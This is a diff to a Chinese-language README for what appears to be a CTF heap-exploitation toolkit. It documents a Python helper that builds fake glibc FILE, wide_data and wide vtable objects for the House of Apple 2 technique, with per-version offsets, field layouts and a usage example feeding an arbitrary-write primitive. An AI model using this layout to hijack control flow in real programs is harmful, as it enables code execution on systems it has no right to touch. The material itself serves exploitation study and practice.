@@ -40,6 +40,124 @@
 
 三份 C 文件已经直接写出各自 ABI 的 fake FILE、wide data 和 fake wide vtable 字段，不再另存重复的布局生成器。2.42～2.43 继续使用 `+0xe0`，但投递原语必须另选。
 
+## Python 离线板子
+
+[`apple2.py`](./apple2.py) 提供 `build_house_of_apple2`，生成 Apple2 最终消费点的对象布局。
+
+### 函数用途
+
+构造以下调用链所需的对象：
+
+```text
+__woverflow(fp, L'A')
+  -> primary vtable 的 _IO_wfile_overflow
+  -> _IO_wdoallocbuf(fp)
+  -> fake wide_data->_wide_vtable->__doallocate(fp)
+  -> callback
+```
+
+### 最小使用示例
+
+```python
+from apple2 import build_house_of_apple2
+
+# 占位地址：题目中换成 libc_base + 偏移 / 已泄露地址
+writes = build_house_of_apple2(
+    "2.35",
+    file_addr=0x100000,          # fake FILE 地址
+    fake_wide_data_addr=0x200000,  # fake wide_data 地址
+    fake_wide_vtable_addr=0x201000,  # fake wide vtable 地址
+    callback_addr=0x401234,      # doallocate 回调
+    wfile_jumps_addr=0x7fff0000, # 合法 _IO_wfile_jumps
+    narrow_buffer_addr=0x300000, # 窄字符缓冲区
+)
+
+# 返回 3 个 MemoryWrite：FILE、wide_data、wide_vtable 三个完整对象镜像
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+
+# 交给题目的任意写：write_primitive(w.address, w.data)
+```
+
+### 对应 PoC
+
+- [`poc_sink_2.24_2.29.c`](./poc_sink_2.24_2.29.c)；
+- [`poc_sink_2.30.c`](./poc_sink_2.30.c)；
+- [`poc_sink_2.31_2.43.c`](./poc_sink_2.31_2.43.c)。
+
+### 版本与 ABI 偏移
+
+| glibc | `_wide_data->_wide_vtable` 偏移 |
+|---|---|
+| 2.24～2.29 | `+0x130` |
+| 2.30 | `+0xf0` |
+| 2.31～2.43 | `+0xe0` |
+
+`_IO_jump_t.__doallocate` 固定位于 vtable `+0x68`。
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `version` | 目标 glibc 版本，支持 `2.24`～`2.43`。 |
+| `file_addr` | fake FILE 或被覆盖 FILE 地址。 |
+| `fake_wide_data_addr` | fake `_IO_wide_data` 地址，写入 `FILE+0xa0`。 |
+| `fake_wide_vtable_addr` | fake wide vtable 地址，写入 fake wide_data 的版本对应槽位。 |
+| `callback_addr` | `__doallocate` 回调地址，写入 fake wide vtable `+0x68`。 |
+| `wfile_jumps_addr` | 目标 libc 合法 `_IO_wfile_jumps` 地址，写入 `FILE+0xd8`。 |
+| `narrow_buffer_addr` | fake FILE 的窄字符缓冲区地址；函数按 `+0x20` 生成结束地址。 |
+| `current_flags` | 当前 `_flags` 值；传入后清除 `NO_WRITES | UNBUFFERED | CURRENTLY_PUTTING`，未知时省略。 |
+
+### 返回对象
+
+返回 3 个 `MemoryWrite`，分别是完整的 FILE、wide_data 和 wide_vtable 镜像。
+`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各 payload 对象：
+
+```text
+FILE 字段写入（file_addr 处）：
+    +0x00  _flags（可选，4 字节）
+    +0xa0  _wide_data = fake_wide_data_addr
+    +0xd8  vtable = wfile_jumps_addr
+    +0xc0  _mode = 1
+    +0x08/+0x10/+0x18  _IO_read_base/_ptr/_end = narrow_buffer_addr
+    +0x20/+0x28/+0x30  _IO_write_base/_ptr/_end = narrow_buffer_addr（end 为 +0x20）
+    +0x38/+0x40  _IO_buf_base/_end = narrow_buffer_addr（end 为 +0x20）
+
+fake wide_data（fake_wide_data_addr 处）：
+    零填充到 _wide_vtable 槽，槽值 = fake_wide_vtable_addr
+
+fake wide_vtable（fake_wide_vtable_addr 处）：
+    零填充到 +0x68，槽值 = callback_addr
+```
+
+使用时对每个 `w in writes` 执行 `write_primitive(w.address, w.data)` 即可；
+调用者不需要自己拼接十几个 FILE 字段补丁。
+
+### 调用者必须提供
+
+```text
+libc 基址和 _IO_wfile_jumps 地址
+能投递 fake FILE / 覆盖现有 FILE 的原语
+能触发 __woverflow 或等价 wide overflow 的入口
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 挂到 _IO_list_all
+不负责 largebin 等投递原语
+不触发 __woverflow
+不处理 callback 的实际 RCE/ORW 逻辑
+```
+
 ## 迁移与调试
 
 1. 先确认投递路径和最终触发点在目标 Build ID 中都存在。
